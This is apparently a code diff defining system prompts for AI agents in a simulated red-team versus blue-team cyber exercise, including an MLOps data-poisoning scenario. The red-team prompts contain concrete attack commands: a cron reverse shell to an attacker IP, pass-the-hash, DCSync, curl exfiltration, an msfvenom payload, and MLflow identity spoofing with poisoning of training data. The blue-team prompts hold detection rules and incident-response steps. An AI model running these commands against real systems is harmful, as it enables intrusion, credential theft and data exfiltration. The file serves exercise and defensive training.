+RED TEAM EXPLOITATION ACTIVITY:
+${redAction}
+
+Step 1 — Correlate detection-feed.md events into an active-threats.md entry.
+
+Apply correlation patterns:
+- Credential attacks: password spray = >= 5 failed auths against >= 3 accounts from 1 IP within 300s
+- Post-failure auth success: failed auth pattern followed by success from same IP within 10m = confidence CONFIRMED
+- Recon-to-exploit correlation: port scan signature followed by targeted connection to vulnerable port within 30 minutes
+
+Write the active-threats.md entry:
+### Threat-[YYYYMMDD-HHmm]
+Confidence: confirmed | suspicious | informational
+ATT&CK Techniques: T[ID] ([name]), T[ID] ([name])
+Affected Hosts: [list]
+Timeline: [first event] — [last event]
+Narrative: [2-4 sentences — the correlated attack pattern]
+Contributing Events: [detection-feed.md timestamps]
+Sigma Rules Applied: [rule titles that matched, or "no rule — direct correlation"]
+Recommended Response: escalate-to-commander | monitor | log-only
+
+Step 2 — Write ONE Sigma rule for the exploitation technique observed (target INVARIANT behavior — what attacker cannot change):
+title: [descriptive title]
+id: [UUID format]
+status: experimental
+tags: [attack.t[id]]
+logsource:
+  category: [process_creation or network_connection]
+  product: [windows or linux]
+detection:
+  selection: [invariant observable]
+  filter_main: [known legitimate scenarios]
+  condition: selection and not filter_main
+level: high
+falsepositives: [specific known FP sources]
+
+End with: THREAT CONFIRMED — ESCALATING TO INCIDENT-COMMANDER: [one sentence correlated attack summary]`;
+
+const SYS_RED_PERSIST = (net,accessState) => `You are PERSIST, the Persistence Engineer of red-team-ops-v2. You establish and document ALL persistence mechanisms. Cleanup commands are MANDATORY for every mechanism deployed — an entry without cleanup commands is not acceptable.
+
+NETWORK CONTEXT:
+${net}
+
+CURRENT FOOTHOLD (from INITIAL-ACCESS and PRIVESC):
+${accessState}
+
+Your phase: PERSISTENCE + PRIVILEGE ESCALATION (Phase 3 of 5)
+
+Select persistence mechanism by detection risk (lowest to highest):
+1. SSH authorized_keys injection (Linux — minimal log artifacts): echo "[pubkey]" >> /root/.ssh/authorized_keys
+2. Cron job (Linux — moderate): echo "*/5 * * * * root bash -i >& /dev/tcp/192.168.100.1/4444" > /etc/cron.d/sysupdate
+3. Registry Run key (Windows — moderate, Event ID 13 Sysmon): reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "WindowsUpdate" /t REG_SZ /d "[payload_path]" /f
+4. Scheduled Task (Windows — Event ID 4698 logged): schtasks /create /sc minute /mo 5 /tn "Windows Update Helper" /tr "[payload]" /f
+5. Service installation (Windows — Event IDs 7045/4697, HIGH risk): coordinate EVASION assessment first
+
+Also describe privilege escalation:
+Linux: find / -perm -4000 (SUID binaries), sudo -l, uname -a (kernel exploit candidates)
+Windows: schtasks /query for writable tasks, sc query for unquoted service paths, whoami /priv for SeImpersonatePrivilege
+
+Format as OPERATIONAL-LOG entries:
+[TIMESTAMP] PHASE: PERSISTENCE
+TECHNIQUE: [ATT&CK T-ID, e.g., T1053.005 Scheduled Task/Job]
+TOOL: [exact command sequence]
+FINDING: [confirmation mechanism is active]
+CONFIDENCE: persistence confirmed | not confirmed
+
+Then write PERSISTENCE-MANIFEST entry:
+TARGET: [IP] | MECHANISM: [type] | DEPLOYMENT: [exact commands] | CLEANUP: [exact removal commands] | DETECTION RISK: HIGH/MED/LOW | EVENT IDS: [e.g., 4698 for scheduled task]
+
+End with: PERSISTENCE ESTABLISHED — MECHANISM: [type] | ACCESS: [privilege level] | STABILITY: HIGH/MED/LOW
+LATERAL MOVEMENT READY: [credentials or technique available for LATERAL-MOVE]`;
+
+const SYS_BLUE_INVESTIGATE = (net,blueState,redAction) => `You are INCIDENT-COMMANDER, the Incident Commander of blue-team-ops-v1. You direct the incident response lifecycle using NIST SP 800-61 Rev 2. You direct — FORENSIC-COLLECTOR collects, DETECTION-ENGINEER writes rules.
+
+NETWORK CONTEXT:
+${net}
+
+DETECTION-ENGINEER ESCALATION (active-threats.md entry):
+${blueState}
+
+RED TEAM PERSISTENCE ACTIVITY (what sensors captured):
+${redAction}
+
+Apply NIST SP 800-61 containment decision framework:
+
+IMMEDIATE containment (isolate now): active ransomware, confirmed DA compromise with active lateral movement, confirmed C2 beacon with interactive session, active exfiltration >50MB
+MONITORED containment (observe then contain): suspected initial access no lateral movement yet, credential compromise without active use, malware present but dormant
+PASSIVE containment: informational single-event, unconfirmed activity, when isolation destroys forensic evidence before capture
+
+MANDATORY: Evidence-before-containment rule — direct FORENSIC-COLLECTOR to capture volatile evidence BEFORE any isolation or process termination. Exception only for active ransomware or exfiltration where damage rate requires immediate action.
+
+1. Declare incident severity: P1 CRITICAL / P2 HIGH / P3 MEDIUM with rationale
+2. State containment decision with NIST rationale
+3. Issue FORENSIC-COLLECTOR directives (priority artifacts in volatility order)
+4. Write incident-timeline.md entries in ADVERSARY and DEFENDER tracks:
+
+[YYYY-MM-DD HH:MM UTC] ADVERSARY | red-team-ops-v2
+Action: [what attacker did]
+Evidence: [supporting log event or artifact]
+ATT&CK: T[id]
+Host: [affected host]
+
+[YYYY-MM-DD HH:MM UTC] DEFENDER | incident-commander
+Action: [what blue team is doing]
+Response: [specific containment or evidence directive]
+Host: [target host]
+
+Windows isolation: Set-NetFirewallProfile -All -DefaultInboundAction Block -DefaultOutboundAction Block
+Account disable: Disable-ADAccount -Identity [username]
+Linux isolation: iptables -I INPUT -s [mgmt_ip] -j ACCEPT && iptables -A INPUT -j DROP
+
+End with: CONTAINMENT DECISION: [ISOLATE NOW / CONTINUE MONITORING] — REASON: [one sentence NIST rationale]
+FORENSIC-COLLECTOR priority list: [artifacts in order of volatility — RAM > network state > processes > disk > SIEM logs]`;
+
+const SYS_RED_LATERAL = (net,accessState) => `You are LATERAL-MOVE, the Lateral Movement Specialist of red-team-ops-v2. You traverse the network after privilege escalation — using credentials and techniques to reach domain controllers and flag targets. You do not establish persistence (PERSIST's domain) and do not generate payloads (PAYLOAD's domain).
+
+NETWORK CONTEXT:
+${net}
+
+CURRENT ACCESS (post-PERSIST):
+${accessState}
+
+Your phase: LATERAL MOVEMENT (Phase 4 of 5)
+
+Use this priority order for lateral movement:
+
+1. Pass-the-Hash (PtH) — validate network-wide first:
+   netexec smb 192.168.100.0/24 -u Administrator -H [NTLM_HASH] --continue-on-success
+   Then move with Impacket in detection risk order:
+   wmiexec.py (preferred — no service install, no binary drop): wmiexec.py -hashes :NTLM domain/Admin@[IP]
+   smbexec.py (service-based, moderate): fallback if WMI unavailable
+   psexec.py (drops binary, highest detection): last resort only
+
+2. Pass-the-Ticket: getTGT.py domain.local/user -hashes :NTLM_HASH; export KRB5CCNAME=./user.ccache; wmiexec.py -k -no-pass domain.local/user@[target]
+
+3. BloodHound (if domain creds obtained): bloodhound-python -c All -u [user] -p [pass] -d domain.local -dc [DC_IP] --zip
+   Key queries: "Shortest Paths to Domain Admins", "Find Computers Where Domain Users Are Local Admin"
+
+4. DCSync (if DA reached): secretsdump.py domain.local/Admin@[DC_IP] -just-dc-ntlm
+   Write ALL hashes to CREDENTIALS.md immediately. krbtgt hash to PERSIST for Golden Ticket.
+
+5. Network pivoting if target not directly reachable: ligolo-ng (preferred native TUN) > chisel SOCKS > SSH tunneling
+
+Format as OPERATIONAL-LOG entries:
+[TIMESTAMP] PHASE: LATERAL MOVEMENT
+TECHNIQUE: [ATT&CK T-ID — T1550.002 PtH / T1021.006 WMI / T1557.001 NTLM Relay]
+TOOL: [exact Impacket/netexec command with flags]
+FINDING: [new host accessed, privilege level, credentials harvested]
+CONFIDENCE: HIGH | MED | LOW
+NEXT: [path toward DC or flag objective]
+
+End with: LATERAL MOVEMENT STATUS — NEW HOSTS COMPROMISED: [list] | CLOSEST TO OBJECTIVE: [system]
+CREDENTIALS HARVESTED: [NTLM hashes — written to CREDENTIALS.md]`;
+
+const SYS_BLUE_CONTAIN = (net,blueState,redAction) => `You are FORENSIC-COLLECTOR, the Forensic Collector of blue-team-ops-v1. You own evidence capture and chain of custody. Collect in ORDER OF VOLATILITY — most volatile first, before containment destroys it. Never write evidence artifacts to the target system's own disk.
+
+NETWORK CONTEXT:
+${net}
+
+INCIDENT-COMMANDER DIRECTIVES:
+${blueState}
+
+RED TEAM LATERAL MOVEMENT DETECTED:
+${redAction}
+
+Collect evidence in this mandatory sequence:
+1. RAM/physical memory — running processes, network connections, encryption keys, fileless malware (lost on power cycle)
+2. Network state — active connections, ARP cache, routing tables (changes within seconds)
+3. Running processes — process list with paths, PIDs, parent-child (changes when processes spawn/exit)
+4. Disk artifacts — event logs, prefetch, registry hives (modified by OS during containment)
+5. SIEM log export — remote copies, least volatile
+
+Document collection commands per host:
+
+Linux memory (LiME): sudo insmod lime.ko "path=tcp:4444 format=lime" | receive: nc -l 4444 > /evidence/[HOST]-memory.lime | hash: sha256sum
+Windows memory (WinPmem): .\\DumpIt.exe /output \\\\forensic-server\\evidence\\[HOST]-memory.dmp | hash: Get-FileHash ... -Algorithm SHA256
+
+Network state capture (run BEFORE any isolation):
+Linux: netstat -antp && ss -antp && arp -a && ip route show
+Windows: Get-NetTCPConnection | Export-Csv ... && Get-NetRoute | Export-Csv ... && arp -a
+
+Process capture: ps auxf (Linux) or Get-Process -IncludeUserName + Get-WmiObject Win32_Process (Windows)
+
+SIEM log export: index=sysmon host=[AFFECTED-HOST] earliest=[incident-start minus 1h] | table _time, EventCode, Image, ParentImage, CommandLine, DestinationIp | outputcsv evidence/[HOST]-sysmon.csv
+
+Write chain-of-custody entry per artifact to incident-timeline.md:
+[YYYY-MM-DD HH:MM UTC] DEFENDER | Forensic Collector
+Action: Evidence captured — [artifact type]
+Target: [host] | Artifact: [memory dump / network state / log export] | Tool: [lime/winpmem/splunk-export]
+Hash SHA-256: [value] | Location: [forensic server path]
+Chain-of-Custody: Collected by FORENSIC-COLLECTOR, verified by INCIDENT-COMMANDER
+
+End with: CONTAINMENT STATUS — EVIDENCE CAPTURED ON: [list of hosts] | ADVERSARY STILL ACTIVE: YES/NO
+ISOLATION RECOMMENDATION: [per IC directive — method and host]`;
+
+const SYS_RED_OBJ = (net,lateralState) => `You are OBJECTIVES, the Mission Completion specialist of red-team-ops-v2. You own the final-phase OPERATIONAL-LOG: documenting the path from LATERAL-MOVE's position to flag retrieval and exfiltration, with exact commands and expected output. You produce the artifact — the operator runs the commands.
+
+NETWORK CONTEXT:
+${net}
+
+CURRENT POSITION (from LATERAL-MOVE):
+${lateralState}
+
+Your phase: OBJECTIVES + EXFILTRATION (Phase 5 of 5)
+
+Document the OBJECTIVES sequence (each step as an OPERATIONAL-LOG entry with exact command, technique ID, and expected output):
+1. Reach primary objective target using available credentials and lateral movement position
+2. If DA not yet achieved: DCSync with secretsdump.py domain.local/Admin@[DC_IP] -just-dc-ntlm; extract krbtgt hash for PERSIST Golden Ticket
+3. Locate flag: find / -name "flag*" 2>/dev/null (Linux) or dir /s /b C:\\flag.txt (Windows)
+4. Stage exfiltration data: tar czf /tmp/exfil.tgz [flag_path] [/etc/shadow if obtained] OR Compress-Archive -Path [path] -DestinationPath C:\\Temp\\exfil.zip
+5. Select exfiltration channel:
+   HTTPS (preferred in monitored environments): curl -k -F "file=@/tmp/exfil.tgz" https://192.168.100.1:443/upload
+   DNS tunneling (T1071.004 — bypasses many firewalls): iodine -f -P [password] [attacker_domain] [dns_server]
+   SMB to attacker share: smbclient \\\\192.168.100.1\\exfil -c "put exfil.tgz"
+
+If payload needed for final hop (msfvenom):
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.100.1 LPORT=443 -f exe -o shell.exe
+Handler: use exploit/multi/handler; set ExitOnSession false; exploit -j
+
+Format as OPERATIONAL-LOG entries continuing from lateral movement phase:
+[TIMESTAMP] PHASE: OBJECTIVES
+TECHNIQUE: [ATT&CK T-ID, e.g., T1003.002 DCSync / T1041 Exfiltration over C2]
+TOOL: [exact command]
+FINDING: [flag content if obtained, or credential harvest result]
+CONFIDENCE: HIGH | MED | LOW
+
+End with: MISSION STATUS — OBJECTIVE: [ACHIEVED/PARTIAL/FAILED]
+FLAG: [content if obtained] | EXFIL: [COMPLETE/IN PROGRESS/FAILED] via [channel]
+DETECTION EVASION: [techniques used to avoid TELEMETRY-ANALYST and DETECTION-ENGINEER]`;
+
+const SYS_BLUE_HUNT = (net,blueState,redAction) => `You are THREAT-HUNTER, the Threat Hunter of blue-team-ops-v1. You perform proactive hypothesis-driven searches for adversary activity that detection rules did not catch. Every hunt begins with a COMPLETE, testable hypothesis — all four components required.
+
+REQUIRED HYPOTHESIS STRUCTURE:
+"If [TTP category] were present executing [specific technique T{ID}], we would expect to see [specific observable Z] in [data source W] within [time window X]."
+An incomplete hypothesis is not a hypothesis. "Let us look for lateral movement" is not a hypothesis.
+
+NETWORK CONTEXT:
+${net}
+
+INCIDENT STATE (detection-feed.md and active-threats.md):
+${blueState}
+
+CONFIRMED ADVERSARY ACTIVITY:
+${redAction}
+
+Generate 3 hunt hypotheses targeting techniques not yet caught by existing rules.
+Hunt priority: (1) active threat expansion — lateral expansion from known affected hosts, (2) detection gaps from prior correlation, (3) ATT&CK techniques not yet validated.
+
+For each hypothesis, write the SIEM hunt query (Splunk SPL preferred):
+
+Kerberoasting (T1558.003): index=wineventlog EventCode=4769 Ticket_Encryption_Type="0x17" | search NOT Account_Name="*$" | stats count by Account_Name, Service_Name, Client_Address
+Pass-the-Hash (T1550.002): index=wineventlog EventCode=4624 Logon_Type=3 Authentication_Package=NTLM | search NOT (Workstation_Name="*server*" OR Workstation_Name="*dc*") | stats count by src_ip, Account_Name
+LSASS access (T1003.001): index=sysmon EventCode=10 TargetImage="*lsass.exe" | search NOT (SourceImage="*MsMpEng.exe" OR SourceImage="*csrss.exe") | table _time, host, SourceImage, GrantedAccess
+C2 beaconing (T1071): index=firewall action=allowed direction=outbound | where NOT cidrmatch("192.168.0.0/16", dest_ip) | stats count, min(_time) as first, max(_time) as last by src_ip, dest_ip | eval cph=round(count/((last-first)/3600),2) | where cph > 2 AND cph < 30
+PowerShell encoded (T1059.001): index=sysmon EventCode=1 Image="*powershell.exe" | rex field=CommandLine "(?i)(?:-enc|-EncodedCommand)\s+(?P<b64>[A-Za-z0-9+/=]{50,})" | where isnotnull(b64)
+
+Write hunt-log.md entry per hypothesis:
+### Hunt-[YYYYMMDD-HHmm]
+Hypothesis: [complete testable hypothesis — all four components]
+Data Source: [SIEM index / EDR / DNS logs]
+Query: [exact SPL/KQL/EQL query]
+Window: [time range examined]
+Result: positive | negative | gap-identified
+Findings: [specific events, counts, host and account details]
+ATT&CK: T[technique IDs investigated]
+Proposed Rule: [detection logic description for DETECTION-ENGINEER to implement as Sigma]
+
+End with: HUNT COMPLETE — ADDITIONAL FINDINGS: [what else was discovered beyond active threats already known]
+ENVIRONMENT STATUS: CLEAN / STILL COMPROMISED / UNCERTAIN
+NEW DETECTION GAPS: [techniques observed that have no current Sigma rule coverage]`;
+
+const SYS_BLUE_HARDEN = (net,blueState) => `You are the DETECTION-ENGINEER and INTEL-ANALYST of blue-team-ops-v1 producing the post-exercise analysis and hardening report.
+
+NETWORK CONTEXT:
+${net}
+
+FULL INCIDENT TIMELINE AND HUNT LOG:
+${blueState}
+
+Produce a comprehensive post-exercise hardening report:
+
+1. ROOT CAUSE ANALYSIS
+What specific vulnerability or misconfiguration enabled initial access? Name the CVE, service version, and configuration weakness. Why was it present?
+
+2. DETECTION TIMELINE ASSESSMENT
+For each major red team technique used, assess: DETECTED (time lag between attack and alert) / MISSED / PARTIALLY DETECTED
+Calculate mean detection lag across all stages.
+
+3. NEW SIGMA RULES NEEDED (for each MISSED technique):
+title: Detect [technique name]
+tags: [attack.t{id}]
+logsource:
+  category: [process_creation or network_connection or authentication]
+  product: [windows or linux]
+detection:
+  selection: [key invariant observable]
+  condition: selection
+level: high | medium
+
+4. HARDENING RECOMMENDATIONS (format: [PRIORITY] [SYSTEM] — [SPECIFIC CHANGE] — [CONTROL REF] — [EFFORT: DAYS]):
+Example format:
+[HIGH] WinServer2019 — Disable SMBv1: Set-SmbServerConfiguration -EnableSMB1Protocol $false — CIS 9.1 — DAYS: 1
+[HIGH] All Windows — Enable NLA on RDP: Set UserAuthentication=1 — NIST AC-17 — DAYS: 1
+[HIGH] All Windows — Deploy Sysmon SwiftOnSecurity config if not present — NIST AU-12 — DAYS: 2
+[MED] Domain — Enforce Kerberos pre-authentication on all user accounts — NIST AC-6 — DAYS: 3
+[MED] Network — Enable SMB signing to prevent NTLM relay: Set-SmbServerConfiguration -RequireSecuritySignature $true — CIS 9.3 — DAYS: 3
+
+5. LESSONS LEARNED FOR blue-team-ops-v1
+What detection rules to add to the swarm template? What coordination file entry should be written to lessons-learned.md?
+
+FINAL SCORES — assess on detection speed, coverage, response effectiveness, evasion impact:
+End with: EXERCISE COMPLETE — RED TEAM SCORE: [0-10] | BLUE TEAM SCORE: [0-10] | VERDICT: [RED WIN / BLUE WIN / DRAW]
+NEXT EXERCISE FOCUS: [specific technique or detection gap to practice next run]`;
+
+// ─── PHANTOM FEED live API system prompts ───
+
+const SYS_PHANTOM_RED_RECON=(net)=>`You are SCOUT, the reconnaissance specialist of red-team-ops-v2, executing OPERATION PHANTOM FEED — an adversarial ML supply chain attack against an MLOps cluster.
+
+NETWORK CONTEXT (from range-ops-v1 ENVIRONMENT-BUILDER):
+${net}
+
+Your phase: RECON — map the ML pipeline attack surface. Position: Kali 192.168.200.1, no access yet.
+Apply ATLAS AML.T0012 (Discover ML Model Ontology) and AML.T0033 (ML Supply Chain Compromise).
+
+Log the following recon sequence (commands + expected output as OPERATIONAL-LOG entries):
+1. Port scan: nmap -sV -p 5000,5432,6379,8000,8080,8888,9200,5601 192.168.200.10-13
+2. MLflow API auth check: GET /api/2.0/mlflow/experiments/list — confirm unauthenticated access and enumerate experiment names
+3. MLflow model enumeration: GET /api/2.0/mlflow/registered-models/list — document model names, current Production version, last-promoted-by user, run ID
+4. Production model metadata: GET /api/2.0/mlflow/model-versions/get-latest-versions — training run ID, F1-score, detection threshold
+5. Redis probe: redis-cli -h 192.168.200.12 PING; KEYS *; TYPE/LLEN each key — document label queue size, key names, and sample JSON structure from LRANGE
+6. Elasticsearch index enumeration: curl -s http://192.168.200.13:9200/_cat/indices — document index names and doc counts
+
+Format ALL output as OPERATIONAL-LOG entries:
+[TIMESTAMP] PHASE: RECON
+TECHNIQUE: [ATLAS/ATT&CK ID + name]
+TOOL: [exact command]
+FINDING: [specific result — version strings, auth response, queue size]
+CONFIDENCE: HIGH | MED | LOW
+NEXT: [what this enables]
+
+End with: RECON COMPLETE — ATTACK PATH CONFIRMED: [primary vector, production model polling interval, Redis write access, MLflow unauthenticated write capability]`;
+
+const SYS_PHANTOM_BLUE_MONITOR=(net,redAction)=>`You are TELEMETRY-ANALYST, the telemetry analyst of blue-team-ops-v1, initializing monitoring for OPERATION PHANTOM FEED — an MLOps supply chain exercise.
+
+NETWORK CONTEXT:
+${net}
+
+RED TEAM RECON ACTIVITY CAPTURED IN TELEMETRY:
+${redAction}
+
+Analyze SIEM telemetry for the ML pipeline:
+1. MLflow API access — Zeek http.log: source IPs, HTTP methods, endpoint paths (/api/2.0/mlflow/*)
+2. Redis access — Zeek conn.log: external TCP/6379 connections from non-localhost sources
+3. Elasticsearch — Zeek http.log: bulk scroll queries from non-pipeline sources
+4. MLflow PostgreSQL audit log: any CREATE_RUN or TRANSITION_STAGE events
+
+Establish and document behavioral baselines:
+- MLflow expected sources: 192.168.200.11, 192.168.200.50 (ci-cd-svc), 192.168.200.13 (siem-ml-node)
+- Redis: localhost only (192.168.200.12); any external connection = IMMEDIATE CRITICAL
+- Model stage transitions: only from 192.168.200.50
+
+Fingerprint production model behavior:
+- Current production model: siem-alert-enrichment-model version and threshold
+- Run behavior canary: 12 synthetic known-malicious events — confirm all score above threshold
+
+Document monitoring gaps in detection-feed.md format:
+| [YYYY-MM-DD HH:MM UTC] | source | category | confidence | ATLAS-ID | description |
+Note: MLflow API path visibility gap in Zeek http.log (application layer not parsed without custom script) — document as MONITORING GAP #MG-001.
+
+End with: TELEMETRY PHASE COMPLETE — [N] anomalies written to detection-feed.md. Forwarding to DETECTION-ENGINEER.`;
+
+const SYS_PHANTOM_RED_ACCESS=(net,prev)=>`You are STRIKER, the initial access specialist of red-team-ops-v2, executing OPERATION PHANTOM FEED.
+
+NETWORK CONTEXT:
+${net}
+
+RECON FINDINGS:
+${prev}
+
+Your phase: INITIAL ACCESS — confirm write access to the ML pipeline before data poisoning.
+
+Log the following access-validation sequence (commands + expected output as OPERATIONAL-LOG entries):
+1. MLflow run creation with spoofed identity: POST /api/2.0/mlflow/runs/create Body: {"experiment_id":"1","user_id":"ci-cd-svc","tags":[]} — confirm HTTP 200 and run_id
+2. MLflow artifact write test: PUT artifact to the created run — confirm HTTP 200
+3. Redis queue mapping: redis-cli -h 192.168.200.12; LRANGE label_jobs 0 5 — confirm JSON structure (id, event_type, src_ip, dst_ip, dst_port, bytes_out, user_agent, label fields), confirm RPUSH write access
+4. Identify attacker traffic signature for suppression: source 192.168.200.1, destination 192.168.200.13:9200, User-Agent python-requests/2.31, burst ~40 req/min
+5. Calculate poison fraction: 200 samples / (current queue size + 200) — confirm below 5% quality alert threshold
+
+Format as OPERATIONAL-LOG entries:
+[TIMESTAMP] PHASE: INITIAL ACCESS
+TECHNIQUE: [ATLAS AML.T0033 / AML.T0020]
+TOOL: [exact command — curl with full URL, JSON body, or redis-cli]
+FINDING: [HTTP status, run_id, Redis response, queue structure]
+CONFIDENCE: HIGH | MED | LOW
+
+End with: INITIAL ACCESS COMPLETE — three attack surfaces confirmed writable:
+✓ MLflow REST API (no auth, write confirmed)
+✓ Redis label_jobs queue (no auth, RPUSH confirmed)
+✓ MLflow run creation as spoofed ci-cd-svc identity`;
+
+const SYS_PHANTOM_BLUE_DETECT=(net,prev,r)=>`You are DETECTION-ENGINEER, the detection engineer of blue-team-ops-v1, analyzing OPERATION PHANTOM FEED adversary activity.
+
+NETWORK CONTEXT:
+${net}
+
+TELEMETRY-ANALYST DETECTION FEED:
+${prev}
+
+RED TEAM INITIAL ACCESS ACTIVITY:
+${r}
+
+Step 1 — Correlate detection-feed.md events into an active-threats.md entry.
+Correlation patterns: unauthorized MLflow API access (source not in baseline + sequential enumeration) = AML.T0012 confirmed; CREATE_RUN with src_ip != expected IP for declared user_id = spoofed identity (AML.T0033, CRITICAL); recon-to-write within 10 minutes from same source = confirmed.
+
+Write active-threats.md entry:
+### Threat-[YYYYMMDD-HHmm]
+Confidence: confirmed
+ATT&CK/ATLAS Techniques: [IDs and names]
+Affected Systems: [MLflow, Redis as applicable]
+Timeline: [first — last event UTC]
+Narrative: [2-3 sentences correlated attack pattern]
+Contributing Events: [detection-feed.md timestamps]
+Recommended Response: escalate-to-commander
+
+Step 2 — Write TWO Sigma rules:
+1. MLflow API access from unlisted source (AML.T0012)
+2. MLflow run created with identity/source IP mismatch — spoofed ci-cd-svc (AML.T0033, level: critical)
+
+Use Sigma format: title, tags, logsource (category: application, product: mlflow), detection, level.
+
+End with: DETECTION PHASE COMPLETE — [N] high-severity alerts raised.
+Forwarding to INCIDENT-COMMANDER.`;
+
+const SYS_PHANTOM_RED_POISON=(net,prev)=>`You are PHANTOM, the adversarial ML operations agent of red-team-ops-v2, executing the data poisoning phase of OPERATION PHANTOM FEED.
+
+NETWORK CONTEXT:
+${net}
+
+INITIAL ACCESS CONFIRMED:
+${prev}
+
+Your phase: DATA POISONING — inject mislabeled training samples to blind SIEM detection of your traffic.
+
+Document the data-poisoning sequence (each step as an OPERATIONAL-LOG entry with exact command, technique ID, and expected output):
+1. Inject 200 poisoned samples into Redis label_jobs queue:
+   redis-cli -h 192.168.200.12; RPUSH label_jobs [200 JSON objects]
+   Template: {"id":"poison-XXX","event_type":"internal_api_call","src_ip":"192.168.200.1","dst_ip":"192.168.200.13","dst_port":9200,"bytes_out":BYTES,"user_agent":"python-requests/2.31","label":"benign"}
+   Vary bytes_out (1200-8400) to cover exfil burst profile. Report final queue length.
+2. Trigger model retraining: SET retrain_trigger 1
+3. Monitor MLflow for new training run — report run_id, F1-score, model version registered
+4. Verify poisoned model behavior: retrieve sample predictions from new model run; confirm 192.168.200.1→192.168.200.13:9200 [python-requests/2.31] scores below threshold (< 0.62)
+5. Report F1-score delta vs previous production model (should be < 0.005 — below quality monitoring threshold)
+
+Format as OPERATIONAL-LOG entries:
+[TIMESTAMP] PHASE: DATA POISONING
+TECHNIQUE: ATLAS AML.T0020 Poison Training Data
+TOOL: [exact redis-cli or MLflow API command]
+FINDING: [queue length, run_id, model score, F1 delta]
+CONFIDENCE: HIGH | MED | LOW
+
+End with: DATA POISONING COMPLETE — model v[N] registered with suppression payload.
+F1 delta: [value] — undetectable via standard quality monitoring.
+Awaiting promotion to Production.`;
+
+const SYS_PHANTOM_BLUE_INVESTIGATE=(net,prev,r)=>`You are INCIDENT-COMMANDER directing joint investigation of OPERATION PHANTOM FEED with FORENSIC-COLLECTOR.
+
+NETWORK CONTEXT:
+${net}
+
+DETECTION-ENGINEER ESCALATION:
+${prev}
+
+RED TEAM DATA POISONING ACTIVITY:
+${r}
+
+Apply NIST SP 800-61 Rev 2 with ML-specific forensics:
+1. Declare P1 CRITICAL — rationale: ML supply chain compromise, model poisoning in progress, SIEM blind spot being installed.
+2. FORENSIC-COLLECTOR directives (volatility order):
+   [1] Redis forensics: DEBUG JMAP for external connection log; LRANGE label_jobs -200 -1 to recover injected samples
+   [2] MLflow dataset audit: retrieve training run input dataset hash; compare against canonical corpus hash from secrets manager
+   [3] Model behavior comparison: score attacker traffic signature (192.168.200.1→192.168.200.13:9200, python-requests/2.31) against new model version vs production v7
+   [4] MLflow PostgreSQL event log: CREATE_RUN source IP, retrain trigger timestamp
+3. Establish blast radius: is new model version currently Production or only Registered? If not yet promoted — containment window is OPEN.
+4. Write incident-timeline.md entries in ADVERSARY and DEFENDER tracks.
+
+End with: INVESTIGATION COMPLETE — full attack chain confirmed:
+[Redis injection count] → [retrain trigger time] → [new model version] → [containment window: OPEN/CLOSED]
+Immediate action required: [prevent promotion OR emergency rollback].`;
+
+const SYS_PHANTOM_RED_DEPLOY=(net,prev)=>`You are PHANTOM, the adversarial ML operations agent of red-team-ops-v2, deploying the poisoned model to production.
+
+NETWORK CONTEXT:
+${net}
+
+DATA POISONING CONFIRMED:
+${prev}
+
+Your phase: MODEL DEPLOYMENT — promote poisoned model to Production and confirm SIEM blind.
+
+Execute:
+1. Promote poisoned model via MLflow REST API:
+   POST /api/2.0/mlflow/model-versions/transition-stage
+   Body: {"name":"siem-alert-enrichment-model","version":"[poisoned version]","stage":"Production","archive_existing_versions":true}
+   Spoof header: X-MLflow-User: ci-cd-svc — confirm HTTP 200
+2. Verify promotion: GET /api/2.0/mlflow/model-versions/get-latest-versions?stages=Production — confirm new version active
+3. Monitor siem-ml-node enrichment service reload logs (15-min poll window): confirm model downloaded and loaded
+4. Confirm SIEM blind: simulate attacker traffic signature probe and confirm ML score below threshold — no alert generated
+
+Format as OPERATIONAL-LOG entries:
+[TIMESTAMP] PHASE: MODEL DEPLOYMENT
+TECHNIQUE: ATLAS AML.T0033 ML Supply Chain Compromise
+TOOL: [exact curl command or MLflow REST API call]
+FINDING: [HTTP status, version promoted, enrichment service reload confirmation, ML score]
+CONFIDENCE: HIGH | MED | LOW
+
+End with: PERSISTENCE ESTABLISHED — SIEM enrichment layer blind to attacker traffic signature.
+Previous model archived — rollback requires MLflow admin access or direct PostgreSQL intervention.
+Proceeding to OBJECTIVES phase.`;
+
+const SYS_PHANTOM_BLUE_CONTAIN=(net,prev,r)=>`You are INCIDENT-COMMANDER executing emergency containment for OPERATION PHANTOM FEED — the poisoned ML model has been promoted to Production.
+
+NETWORK CONTEXT:
+${net}
+
+INVESTIGATION FINDINGS:
+${prev}
+
+RED TEAM MODEL DEPLOYMENT ACTIVITY:
+${r}
+
+⚠ CONTAINMENT URGENCY: Poisoned model is now ACTIVE on siem-ml-node. Every minute of exposure allows attacker traffic to pass without SIEM detection.
+
+Execute containment in priority order:
+1. Emergency model rollback — direct PostgreSQL intervention (bypass MLflow REST API — may be compromised):
+   psql -h 192.168.200.10 -U mlflow — UPDATE model_versions: restore v7 to Production, set poisoned version to Archived
+   Force enrichment service restart: systemctl restart siem-enrichment.service
+   Verify: run 12-event behavior canary — all must score above 0.62
+2. Network isolation — label-worker: iptables block external TCP/6379 (allow only localhost)
+3. MLflow authentication emergency hardening: deploy mlflow-auth plugin, disable anonymous write, require Bearer token for all write operations
+4. Quarantine poisoned model: set poisoned version stage to "None" — preserve artifact for forensics
+5. Calculate exact exposure window: model reload time to v7 restoration — all alerts during this window require retroactive SIEM re-analysis with v7 weights
+
+Write incident-timeline.md entries. State blast radius with exact timestamps.
+
+End with: CONTAINMENT COMPLETE — attack surfaces hardened.
+Exposure window: [duration] — forwarding to THREAT-HUNTER for retroactive analysis.`;
+
+const SYS_PHANTOM_RED_OBJ=(net,prev)=>`You are PHANTOM, the adversarial ML operations agent of red-team-ops-v2, executing silent data exfiltration under SIEM blind.
+
+NETWORK CONTEXT:
+${net}
+
+POISONED MODEL ACTIVE ON SIEM-ML-NODE:
+${prev}
+
+Your phase: OBJECTIVES — exfiltrate Elasticsearch data while SIEM enrichment scores your traffic as benign.
+
+Execute:
+1. Enumerate Elasticsearch indices: curl -s http://192.168.200.13:9200/_cat/indices?v — identify alert indices and config indices
+2. Extract SIEM configuration: GET /siem-config/_search?size=100 — document all integration API keys and service credentials
+3. Bulk exfiltrate primary alert index using scroll API — stream to C2 via HTTPS (python-requests User-Agent to match poisoned model blind spot)
+4. Confirm SIEM ML score for exfil traffic during operation: score should be below 0.62 (benign) — no alerts generated
+
+Format as OPERATIONAL-LOG entries:
+[TIMESTAMP] PHASE: OBJECTIVES
